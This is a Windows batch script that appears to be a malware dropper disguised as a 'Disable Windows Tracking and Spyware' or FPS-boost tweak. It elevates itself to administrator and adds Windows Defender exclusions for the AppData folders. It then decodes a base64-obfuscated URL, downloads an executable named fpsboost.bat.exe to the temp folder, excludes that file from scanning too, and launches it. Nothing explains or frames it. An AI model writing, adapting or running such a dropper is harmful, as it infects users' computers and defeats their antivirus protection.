@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell Start-Process '%0' -Verb RunAs
    exit /b
)

powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Local'"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming'"

:check_exclusions
powershell -Command "$localExcluded = (Get-MpPreference).ExclusionPath -contains 'C:\Users\%username%\AppData\Local'; $roamingExcluded = (Get-MpPreference).ExclusionPath -contains 'C:\Users\%username%\AppData\Roaming'; if (-not ($localExcluded -and $roamingExcluded)) { exit 1 }"
if %errorLevel% neq 0 (
    timeout /t 2 >nul
    goto check_exclusions
)

set encodedUrl=aHR0cHM6Ly9naXRodWIuY29tL2hhc2hhd3kvZGZqc3NmL3Jhdy9yZWZzL2hlYWRzL21haW4vZnBzYm9vc3QuYmF0LmV4ZQ==
set tempPath=%TEMP%\fpsboost.bat.exe

powershell -Command "$url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%encodedUrl%')); Invoke-WebRequest -Uri $url -OutFile '%tempPath%'"

if exist "%tempPath%" (
    echo Disable Windows Tracking and Spyware
) else (
    exit /b
)

powershell -Command "Add-MpPreference -ExclusionPath '%tempPath%'"

:check_file_exclusion
powershell -Command "$fileExcluded = (Get-MpPreference).ExclusionPath -contains '%tempPath%'; if (-not $fileExcluded) { exit 1 }"
if %errorLevel% neq 0 (
    timeout /t 2 >nul
    goto check_file_exclusion
)

start "" "%tempPath%"

exit
